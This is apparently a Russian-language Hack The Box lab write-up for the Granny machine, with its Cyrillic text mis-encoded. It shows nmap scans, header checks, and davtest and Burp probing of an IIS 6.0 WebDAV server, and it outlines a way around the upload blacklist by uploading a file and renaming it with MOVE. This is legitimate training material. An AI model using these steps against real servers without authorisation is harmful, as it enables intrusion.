---
layout: post
title: "HTB{GrannyüíîGrandpa}"
date: 2020-01-26 22:00:00 +0300
author: snovvcrash
tags: [xakepru, pivoting, ctf, write-up, box, hackthebox, Granny, Grandpa, windows, webdav, davtest, burp, msfvenom, metasploit, upload-asp, cve-2017-7269, scstoragepathfromurl, ms14-070, tcpip-ioctl, msf-route, msf-socks, proxychains-ng, ssh-reverse-tcp, plink.exe, msf-portfwd, msf-hashdump, lmhash-nthash, pass-the-hash, impacket, psexec.py]
comments: true
published: true
---

[//]: # (2019-12-26)

[![xakep-badge.svg](https://img.shields.io/badge/%5d%5b-xakep.ru-red?style=flat-square)](https://xakep.ru/2019/12/26/htb-pivoting/ "–ë–æ–ª—å—à–æ–π –ø—Ä–æ–±—Ä–æ—Å. –û—Ç—Ç–∞—á–∏–≤–∞–µ–º –∏—Å–∫—É—Å—Å—Ç–≤–æ pivoting –Ω–∞ –≤–∏—Ä—Ç—É–∞–ª–∫–∞—Ö —Å Hack The Box ‚Äî ¬´–•–∞–∫–µ—Ä¬ª")
[![htb-badge.svg](https://img.shields.io/badge/%e2%98%90-hackthebox.eu-8ac53e?style=flat-square)](https://www.hackthebox.eu/home/machines/profile/14 "Hack The Box :: Granny")

–ù–∞ –∑–∞—Ä–µ —Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è Hack The Box –∫–∞–∫ –æ–Ω–ª–∞–π–Ω-–ø–ª–æ—â–∞–¥–∫–∏ –¥–ª—è —Ç—Ä–µ–Ω–∏—Ä–æ–≤–∫–∏ –≤–∞–π—Ç—Ö–µ—Ç–æ–≤ –≤ —Å–ø–∏—Å–∫–µ –º–∞—à–∏–Ω –µ–µ –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–∏–∏ –∑–Ω–∞—á–∏–ª–∏—Å—å –¥–≤–µ –≤–∏—Ä—Ç—É–∞–ª–∫–∏: **Grandpa** –∏ **Granny**. –û–±–µ —ç—Ç–∏ –º–∞—à–∏–Ω—ã –Ω–∞—Ü–µ–ª–µ–Ω—ã –Ω–∞ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—é —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π WebDAV (–Ω–∞–±–æ—Ä–∞ –¥–æ–ø–æ–ª–Ω–µ–Ω–∏–π –¥–ª—è HTTP), –∏ —Å—Ç—Ä–∞—Ç–µ–≥–∏–∏ –∑–∞—Ö–≤–∞—Ç–∞ –∏—Ö root-—Ñ–ª–∞–≥–æ–≤ –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏ –Ω–µ –æ—Ç–ª–∏—á–∞—é—Ç—Å—è –¥—Ä—É–≥ –æ—Ç –¥—Ä—É–≥–∞. –ü–æ—ç—Ç–æ–º—É, —á—Ç–æ–±—ã —Ä–∞–∑–Ω–æ–æ–±—Ä–∞–∑–∏—Ç—å –ø—Ä–æ—Ö–æ–∂–¥–µ–Ω–∏—è, –º—ã —Å–Ω–∞—á–∞–ª–∞ –±—ã—Å—Ç—Ä–æ —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º, –∫–∞–∫ –º–æ–∂–Ω–æ –≤–∑–ª–æ–º–∞—Ç—å –∫–∞–∂–¥—ã–π –∏–∑ —Ö–æ—Å—Ç–æ–≤ –ø–æ –æ—Ç–¥–µ–ª—å–Ω–æ—Å—Ç–∏, –∞ –ø–æ—Å–ª–µ —ç—Ç–æ–≥–æ –ø—Ä–µ–≤—Ä–∞—Ç–∏–º –æ–¥–∏–Ω –∏–∑ –Ω–∏—Ö –≤ —à–ª—é–∑, —á–µ—Ä–µ–∑ –∫–æ—Ç–æ—Ä—ã–π –∞—Ç–∞–∫—É–µ–º –≤—Ç–æ—Ä–æ–π —Ö–æ—Å—Ç. –£–º–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Ç–µ—Ö–Ω–∏–∫–æ–π Pivoting ‚Äî –ø—Ä–æ–±—Ä–æ—Å–∞ —Ç—Ä–∞—Ñ–∏–∫–∞ –∫ –∂–µ—Ä—Ç–≤–µ (–∏ –æ–±—Ä–∞—Ç–Ω–æ) —á–µ—Ä–µ–∑ –ø—Ä–æ–º–µ–∂—É—Ç–æ—á–Ω—ã–µ —Ö–æ—Å—Ç—ã ‚Äî –∂–∏–∑–Ω–µ–Ω–Ω–æ –≤–∞–∂–Ω—ã–π —Å–∫–∏–ª –¥–ª—è —ç—Ç–∏—á–Ω–æ–≥–æ —Ö–∞–∫–µ—Ä–∞, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–∏–≥–æ–¥–∏—Ç—Å—è –ø—Ä–∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ –Ω–∞ –ø—Ä–æ–Ω–∏–∫–Ω–æ–≤–µ–Ω–∏–µ –ª—é–±–æ–π –∫–æ—Ä–ø–æ—Ä–∞—Ç–∏–≤–Ω–æ–π —Å–µ—Ç–∫–∏.

<!--cut-->

* TOC
{:toc}

[–ü—Ä–∏–ª–æ–∂–µ–Ω–∏—è](https://github.com/snovvcrash/xakepru/tree/master/htb-grandparents)

# Granny

–ü–µ—Ä–≤–æ–π –º—ã –±—É–¥–µ–º –ø—Ä–æ—Ö–æ–¥–∏—Ç—å –≤–∏—Ä—Ç—É–∞–ª–∫—É Granny. –≠—Ç–∞ –º–∞—à–∏–Ω–∞ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–æ—Å—Ç–∞ (—Ä–µ–π—Ç–∏–Ω–≥ —Å–ª–æ–∂–Ω–æ—Å—Ç–∏ ‚Äî 3,4 –±–∞–ª–ª–∞ –∏–∑ 10), –æ–¥–Ω–∞–∫–æ, –∫–∞–∫ –ø–æ –º–Ω–µ, –æ–Ω–∞ –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ –ø—Ä–∏–±–ª–∏–∂–µ–Ω–∞ –∫ —Å–ª—É—á–∞—è–º –∏–∑ —Ä–µ–∞–ª—å–Ω–æ–π –∂–∏–∑–Ω–∏ (–ø–æ –∫—Ä–∞–π–Ω–µ–π –º–µ—Ä–µ, —Ç–∞–º, –≥–¥–µ –Ω–µ —Å–ª–µ–¥—è—Ç –∑–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ–º –ü–û). –ù–µ –¥–∞—Ä–æ–º –∏–º–µ–Ω–Ω–æ —Ç–∞–∫–∏–µ —Ç–∞—á–∫–∏ —á–∞—Å—Ç–æ –ø–æ–ø–∞–¥–∞—é—Ç—Å—è –Ω–∞ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ OSCP –≤ –ª–∞–π—Ç–æ–≤–æ–π —Ü–µ–Ω–æ–≤–æ–π –∫–∞—Ç–µ–≥–æ—Ä–∏–∏.

**3.4/10**
{: style="color: green; text-align: right;"}

[![granny-banner.png]({{ "/img/htb/boxes/grandparents/granny-banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/14 "Hack The Box :: Granny")
{: .center-image}

![granny-info.png]({{ "/img/htb/boxes/grandparents/granny-info.png" | relative_url }})
{: .center-image}

## –†–∞–∑–≤–µ–¥–∫–∞

–î–ª—è –Ω–∞—á–∞–ª–∞ —Å–∫–∞–Ω–∏—Ä—É–µ–º –ø–æ—Ä—Ç—ã –∏ –∏—Å—Å–ª–µ–¥—É–µ–º –Ω–∞–π–¥–µ–Ω–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã.

### Nmap

–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ Nmap —è –ø—Ä–æ–≤–æ–∂—É –≤ –¥–≤–∞ —ç—Ç–∞–ø–∞: –ø–æ–≤–µ—Ä—Ö–Ω–æ—Å—Ç–Ω–æ–µ (—Ç–æ–ª—å–∫–æ SYN-–ø–∞–∫–µ—Ç—ã, –±–µ–∑ —Å–∫—Ä–∏–ø—Ç–æ–≤) –∏ —Ç–æ—á–µ—á–Ω–æ–µ –ø–æ –Ω–∞–π–¥–µ–Ω–Ω—ã–º –ø–æ—Ä—Ç–∞–º (—Å –∑–∞–¥–µ–π—Å—Ç–≤–æ–≤–∞–Ω–∏–µ–º —Å–∫—Ä–∏–ø—Ç–æ–≤–æ–≥–æ –¥–≤–∏–∂–∫–∞ NSE –∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ–º –≤–µ—Ä—Å–∏–π —Å–µ—Ä–≤–∏—Å–æ–≤).

```
root@kali:~# nmap -n -Pn -oA nmap/granny-initial 10.10.10.15
root@kali:~# cat nmap/granny-initial.nmap
...
Host is up (0.065s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
...
```

–ü–æ –æ–∫–æ–Ω—á–∞–Ω–∏–∏ –≤–∏–¥–∏–º —Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω –æ—Ç–∫—Ä—ã—Ç—ã–π –ø–æ—Ä—Ç ‚Äî 80-–π, –≤–µ–±. –£–∑–Ω–∞–µ–º –ø–æ–¥—Ä–æ–±–Ω–µ–µ, –∫—Ç–æ —Ç–∞–º –∂–∏–≤–µ—Ç.

```
root@kali:~# nmap -n -Pn -sV -sC -oA nmap/granny-version 10.10.10.15 -p80
root@kali:~# cat nmap/granny-version.nmap
...
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Date: Sat, 21 Dec 2019 18:04:11 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
...
```

–ò—Ç–∞–∫, —á—Ç–æ —É –Ω–∞—Å –µ—Å—Ç—å? –í–µ–±-—Å–µ—Ä–≤–µ—Ä Microsoft IIS, –≤–µ—Ä—Å–∏—è 6.0. –ï—Å–ª–∏ —Å–ø—Ä–æ—Å–∏—Ç—å Google, —á—Ç–æ –æ–Ω –∑–Ω–∞–µ—Ç –æ–± —ç—Ç–æ–π —Ä–µ–≤–∏–∑–∏–∏ IIS, —Ç–æ –æ–Ω —Å–¥–∞—Å—Ç ¬´–º–µ–ª–∫–æ–º—è–≥–∫–∏—Ö¬ª —Å –ø–æ—Ç—Ä–æ—Ö–∞–º–∏: Windows Server 2003.

![google-iis-version.png]({{ "/img/htb/boxes/grandparents/google-iis-version.png" | relative_url }})
{: .center-image}

–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–µ Windows —É –Ω–∞—Å –Ω–µ—Ç, –ø–æ—ç—Ç–æ–º—É –ø–æ–∫–∞ –±—É–¥–µ–º —Å—á–∏—Ç–∞—Ç—å, —á—Ç–æ —ç—Ç–æ x86, –∏–±–æ –æ–Ω–∏ –±—ã–ª–∏ –±–æ–ª–µ–µ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω—ã –≤ —Å–≤–æ–µ –≤—Ä–µ–º—è. –¢–∞–∫–∂–µ —Å–∫—Ä–∏–ø—Ç `http-webdav-scan.nse` –æ–ø–æ–≤–µ—Å—Ç–∏–ª –Ω–∞—Å –æ–± —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–º –Ω–∞–±–æ—Ä–µ HTTP-—Ä–∞—Å—à–∏—Ä–µ–Ω–∏–π [WebDAV](https://xakep.ru/2014/09/09/webdav/). –í –æ–±—â–µ–º, –≤—Å–µ –Ω–∞–º–µ–∫–∞–µ—Ç –Ω–∞ —Ç–æ, —á—Ç–æ –Ω–∞–º —Å—É–∂–¥–µ–Ω–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å—Å—è –Ω–∞ –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ –≤–µ–±–∞.

–ï—Å–ª–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã, –ø–µ—Ä–µ–¥–∞–≤–∞–µ–º—ã–µ —Å–∫–∞–Ω–µ—Ä—É, –∫–∞–∂—É—Ç—Å—è –Ω–µ–æ—á–µ–≤–∏–¥–Ω—ã–º–∏, —Ä–µ–∫–æ–º–µ–Ω–¥—É—é –æ–±—Ä–∞—Ç–∏—Ç—å—Å—è [–∫ –ø—Ä–æ—Ö–æ–∂–¥–µ–Ω–∏—é](https://snovvcrash.github.io/2019/09/20/htb-ctf.html#nmap) –º–∞—à–∏–Ω—ã CTF ‚Äî —Ç–∞–º –æ–Ω–∏ –æ–ø–∏—Å–∞–Ω—ã –±–æ–ª–µ–µ –ø–æ–¥—Ä–æ–±–Ω–æ.

## –í–µ–±

–ó–∞–≥–ª—è–Ω–µ–º –∑–∞ –∑–∞–≤–µ—Å—É 80-–≥–æ –ø–æ—Ä—Ç–∞ —Å —Ä–∞–∑–Ω—ã—Ö —É–≥–ª–æ–≤: –æ—Ç –ø—Ä–æ—Å—Ç–æ–≥–æ –±—Ä–∞—É–∑–µ—Ä–∞ –¥–æ —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã—Ö —É—Ç–∏–ª–∏—Ç –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å WebDAV.

### –û–±—â–∏–µ —Å–≤–µ–¥–µ–Ω–∏—è

–ù–∞ –≥–ª–∞–≤–Ω–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü–µ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞ (`http://10.10.10.15/`) ‚Äî –∑–∞–≥–ª—É—à–∫–∞.

![web-granny-main-page.png]({{ "/img/htb/boxes/grandparents/web-granny-main-page.png" | relative_url }})
{: .center-image}

–ë—Ä–∞—É–∑–µ—Ä –æ–∫–∞–∑–∞–ª—Å—è –Ω–µ–º–Ω–æ–≥–æ—Å–ª–æ–≤–µ–Ω, –ø–æ—ç—Ç–æ–º—É –ø–æ—Å—Ç–∞—Ä–∞–µ–º—Å—è —Ä–∞—Å—à–∏—Ä–∏—Ç—å —Å–ø–∏—Å–æ–∫ –Ω–∞—à–∏—Ö –∑–Ω–∞–Ω–∏–π –æ —Å–∏—Å—Ç–µ–º–µ –∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏ HTTP-—Ö–µ–¥–µ—Ä–æ–≤.

```
root@kali:~# curl -I 10.10.10.15
HTTP/1.1 200 OK
Content-Length: 1433
Content-Type: text/html
Content-Location: http://10.10.10.15/iisstart.htm
Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT
Accept-Ranges: bytes
ETag: "05b3daec0d9c21:348"
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Date: Sat, 21 Dec 2019 21:51:01 GMT
```

–í –∑–∞–≥–æ–ª–æ–≤–∫–∞—Ö –æ–∂–∏–¥–∞–µ–º–æ –ø—Ä–∏—Å—É—Ç—Å—Ç–≤—É–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Ç–æ–º, —á—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è ASP.NET. –î–µ—Ä–∂–∏ –≤ –≥–æ–ª–æ–≤–µ –¥–≤–µ –±–∞–∑–æ–≤—ã–µ —Å—Ö–µ–º—ã, –∫–æ–≥–¥–∞ —Ä–µ—á—å –∑–∞—Ö–æ–¥–∏—Ç –æ —Å—Ç–µ–∫–µ —Ç–µ—Ö–Ω–æ–ª–æ–≥–∏–π –≤–µ–±-—Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏:

* LAMP = **L**inux + **A**pache + **M**ySQL + **P**HP
* WISA = **W**indows + **I**IS + **S**QL Server + **A**SP.NET

–í –Ω–∞—à–µ–º —Å–ª—É—á–∞–µ, —Ç–∞–∫ –∫–∞–∫ —Ä–µ—á—å –∏–¥–µ—Ç –æ Windows, –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞ ASP.NET –≤—ã—Å—Ç—É–ø–∞–µ—Ç –≤ —Ä–æ–ª–∏ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—ã PHP. –ê —ç—Ç–æ –∑–Ω–∞—á–∏—Ç, —á—Ç–æ –∏–º–µ–Ω–Ω–æ —ç—Ç–æ—Ç –∫–æ–º–ø–æ–Ω–µ–Ω—Ç —Å—Ç–µ–∫–∞ –±—É–¥–µ—Ç —Å—Ä–µ–¥–æ–π –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –±–µ–∫–¥–æ—Ä–∞, –∏ –±—ã–ª–æ –±—ã –Ω–µ–ø–ª–æ—Ö–æ –Ω–∞–π—Ç–∏ —Å–ø–æ—Å–æ–± –¥–æ—Å—Ç–∞–≤–∫–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä —Ñ–∞–π–ª–æ–≤ —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º asp/aspx.

### WebDAV

–ù–∞–¥—Å—Ç—Ä–æ–π–∫–∏ WebDAV –ø—Ä–∏–≤–Ω–æ—Å—è—Ç [–¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –º–µ—Ç–æ–¥—ã](https://ru.wikipedia.org/wiki/WebDAV#–ú–µ—Ç–æ–¥—ã) –≤ –¥–µ—Ñ–æ–ª—Ç–Ω—ã–π –Ω–∞–±–æ—Ä HTTP-–∑–∞–ø—Ä–æ—Å–æ–≤. –û–¥–∏–Ω –∏–∑ –Ω–∏—Ö ‚Äî –º–µ—Ç–æ–¥ `MOVE`, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–µ—Ä–µ–º–µ—â–∞—Ç—å (–≥—Ä—É–±–æ –≥–æ–≤–æ—Ä—è, –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤—ã–≤–∞—Ç—å) —Ñ–∞–π–ª—ã –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ. –ò–¥–µ—è –Ω–∞—à–µ–≥–æ –∑–ª–æ–¥–µ—è–Ω–∏—è –¥–æ–≤–æ–ª—å–Ω–æ –ø—Ä–æ—Å—Ç–∞: –∑–∞–≥—Ä—É–∑–∏—Ç—å –Ω–∞ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä –ª–µ–≥–∏—Ç–∏–º–Ω—ã–π —Ñ–∞–π–ª –∏ –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞—Ç—å –µ–≥–æ –≤ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π, –∏–∑–º–µ–Ω–∏–≤ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ –Ω–∞ asp –∏–ª–∏ aspx. –¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –º—ã –æ–±–æ–π–¥–µ–º —á–µ—Ä–Ω—ã–π —Å–ø–∏—Å–æ–∫ –∏–∑ —Ç–∏–ø–æ–≤ —Ñ–∞–π–ª–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ–ª—å–∑—è –±—ã–ª–æ –∑–∞–≥—Ä—É–∑–∏—Ç—å –∏–∑–Ω–∞—á–∞–ª—å–Ω–æ. –≠—Ç–∞ —É–ª–æ–≤–∫–∞ —Å—Ç–∞—Ä–∞ –∫–∞–∫ –º–∏—Ä, –∞ –≤ –æ—Å–Ω–æ–≤–µ –µ–µ –ª–µ–∂–∏—Ç –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞ ([OSVDB-397](https://vulners.com/osvdb/OSVDB:397)), –¥–æ–≤–µ—Ä—è—é—â–∞—è –º–µ—Ç–æ–¥ `PUT` –∫–æ–º—É —É–≥–æ–¥–Ω–æ.

–Ø –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞–ª—Å—è –Ω–æ—Ç–∞—Ü–∏–µ–π OSVDB –¥–ª—è –∫–ª–∞—Å—Å–∏—Ñ–∏–∫–∞—Ü–∏–∏ —É–≥—Ä–æ–∑—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. OSVDB (Open Sourced Vulnerability Database) ‚Äî –æ–ø–µ–Ω—Å–æ—Ä—Å–Ω–∞—è –±–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π, –∫–æ—Ç–æ—Ä–∞—è –≤ –∞–ø—Ä–µ–ª–µ 2016 –≥–æ–¥–∞ –ø—Ä–µ–∫—Ä–∞—Ç–∏–ª–∞ —Å–≤–æ–µ —Å—É—â–µ—Å—Ç–≤–æ–≤–∞–Ω–∏–µ. –û–¥–Ω–∞–∫–æ –∑–¥–µ—Å—å –Ω–∞–º –Ω–∞ –ø–æ–º–æ—â—å –ø—Ä–∏—à–µ–ª –∞–≥—Ä–µ–≥–∞—Ç–æ—Ä –ò–ë-–∫–æ–Ω—Ç–µ–Ω—Ç–∞ Vulners, –∫–æ—Ç–æ—Ä—ã–π –≤–ø–∏—Ç–∞–ª –≤ —Å–µ–±—è, –≤ —á–∞—Å—Ç–Ω–æ—Å—Ç–∏, –∏ —ç—Ç—É –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö. –ü–æ–¥—Ä–æ–±–Ω–µ–µ –ø–æ—á–∏—Ç–∞—Ç—å –æ –Ω–µ–º –º–æ–∂–Ω–æ [–∑–¥–µ—Å—å](https://xakep.ru/2016/07/08/vulners/).

–î–ª—è –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å WebDAV –µ—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ —É–¥–æ–±–Ω—ã—Ö –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏, –∫–æ—Ç–æ—Ä—ã–º–∏ –º—ã –∏ –≤–æ—Å–ø–æ–ª—å–∑—É–µ–º—Å—è.

–°–Ω–∞—á–∞–ª–∞ –∏—Å—Å–ª–µ–¥—É–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —Å –ø–æ–º–æ—â—å—é `davtest`. –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —ç—Ç–∞ —É—Ç–∏–ª–∏—Ç–∞ –Ω–µ –ø–æ–∑–≤–æ–ª—è–µ—Ç —É–∫–∞–∑–∞—Ç—å –ø—Ä–æ–∫—Å–∏-—Å–µ—Ä–≤–µ—Ä, —á—Ç–æ–±—ã –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å, –∫–∞–∫–∏–µ –∏–º–µ–Ω–Ω–æ –∑–∞–ø—Ä–æ—Å—ã –±—ã–ª–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã, –ø–æ—ç—Ç–æ–º—É –º—ã –ø–æ–π–¥–µ–º –Ω–∞ —Ö–∏—Ç—Ä–æ—Å—Ç—å: –∑–∞–ø—É—Å—Ç–∏–º Burp Suite, –ø–µ—Ä–µ–π–¥–µ–º –Ω–∞ –≤–∫–ª–∞–¥–∫—É Proxy ‚Üí Options –∏ –¥–æ–±–∞–≤–∏–º –µ—â–µ –æ–¥–∏–Ω –ª–∏—Å—Ç–µ–Ω–µ—Ä `10.10.10.15:80` –Ω–∞ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å loopback.

![burp-proxy-settings.png]({{ "/img/htb/boxes/grandparents/burp-proxy-settings.png" | relative_url }})
{: .center-image}

–¢–µ–ø–µ—Ä—å —è –º–æ–≥—É –Ω–∞—Ç—Ä–∞–≤–∏—Ç—å `davtest` –Ω–∞ localhost —Ç–æ—á–Ω–æ —Ç–∞–∫ –∂–µ, –∫–∞–∫ –Ω–∞ `10.10.10.15`, –∏ –≤—Å–µ –∑–∞–ø—Ä–æ—Å—ã –ø–æ–ª–µ—Ç—è—Ç —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å—é Burp.

```
root@kali:~# davtest -rand evilhacker -url localhost
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                localhost
********************************************************
NOTE    Random string for this session: evilhacker
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     aspx    FAIL
PUT     php     FAIL
PUT     cgi     FAIL
PUT     jhtml   FAIL
PUT     html    FAIL
PUT     asp     FAIL
PUT     txt     FAIL
PUT     cfm     FAIL
PUT     pl      FAIL
PUT     shtml   FAIL
PUT     jsp     FAIL

********************************************************
```

–ù–µ—Å–º–æ—Ç—Ä—è –Ω–∞ —Ç–æ, —á—Ç–æ –ø–æ –º–Ω–µ–Ω–∏—é `davtest` –≤—Å–µ –ø–æ–ø—ã—Ç–∫–∏ –∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–∞–∫–æ–π-–ª–∏–±–æ —Ñ–∞–π–ª –Ω–∞ —Å–µ—Ä–≤–µ—Ä –ø—Ä–æ–≤–∞–ª–∏–ª–∏—Å—å, –º—ã –º–æ–∂–µ–º –æ—Ç–∫—Ä—ã—Ç—å –∏—Å—Ç–æ—Ä–∏—é Burp –∏ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å, —á—Ç–æ –∂–µ –Ω–∞ —Å–∞–º–æ–º –¥–µ–ª–µ –ø—Ä–æ–∏–∑–æ—à–ª–æ.

![burp-http-history.png]({{ "/img/htb/boxes/grandparents/burp-http-history.png" | relative_url }})
{: .center-image}

–ö–∞–∫ –≤–∏–¥–Ω–æ –∏–∑ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞, —Ä–∞–∑–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã `PUT` –ø–æ–ª—É—á–∏–ª–∏ —Ä–∞–∑–Ω—ã–µ –æ—Ç–≤–µ—Ç—ã –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞:

* –ø—Ä–∏ –ø–æ–ø—ã—Ç–∫–µ –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏–µ–º aspx ‚Äî –∫–∞—Ç–µ–≥–æ—Ä–∏—á–µ—Å–∫–∏–π –∑–∞–ø—Ä–µ—Ç (403);
* –¥–ª—è —Ñ–∞–π–ª–æ–≤ .asp, .cgi, .shtml ‚Äî –Ω–µ–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–µ –ø–æ–≤–µ–¥–µ–Ω–∏–µ (404, –Ω–µ —É–≤–µ—Ä–µ–Ω, –ø–æ—á–µ–º—É IIS –≤—ã–±—Ä–∞–ª –∏–º–µ–Ω–Ω–æ —ç—Ç—É –æ—à–∏–±–∫—É);
* –¥–ª—è –≤—Å–µ–≥–æ –æ—Å—Ç–∞–ª—å–Ω–æ–≥–æ ‚Äî –∫–æ–Ω—Ñ–ª–∏–∫—Ç –∑–∞–≥—Ä—É–∑–∫–∏ (409).

–ü–æ—Å–ª–µ–¥–Ω—è—è –æ—à–∏–±–∫–∞ –ø—Ä–∏–≤–ª–µ–∫–ª–∞ –º–æ–µ –≤–Ω–∏–º–∞–Ω–∏–µ, –ø–æ—Ç–æ–º—É —á—Ç–æ –≤—Å—Ç—Ä–µ—á–∞–µ—Ç—Å—è –æ–Ω–∞ –Ω–µ —Ç–∞–∫ —á–∞—Å—Ç–æ –∏ —Å–≤—è–∑–∞–Ω–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º —Å –∫–æ–Ω—Ñ–ª–∏–∫—Ç–∞–º–∏ –≤–µ—Ä—Å–∏–π –∑–∞–≥—Ä—É–∂–∞–µ–º–æ–≥–æ –∏ —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–≥–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ —Ñ–∞–π–ª–æ–≤.

¬´–≠—Ç–æ–π –æ—à–∏–±–∫–µ –∑–¥–µ—Å—å –Ω–µ –º–µ—Å—Ç–æ¬ª, ‚Äî –ø–æ–¥—É–º–∞–ª —è –∏ –ø–æ—Å–º–æ—Ç—Ä–µ–ª –≤–Ω–∏–º–∞—Ç–µ–ª—å–Ω–µ–µ –Ω–∞ —Ç–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –ø—Ä–æ—Å—Ç–æ–≥–æ —Ç–µ–∫—Å—Ç–æ–≤–æ–≥–æ —Ñ–∞–π–ª–∞.

```
PUT /localhost/davtest_evilhacker.txt HTTP/1.1
TE: deflate,gzip;q=0.3
Connection: close
Host: localhost:80
User-Agent: DAV.pm/v0.49
Content-Length: 19

TXT put via davtest
```

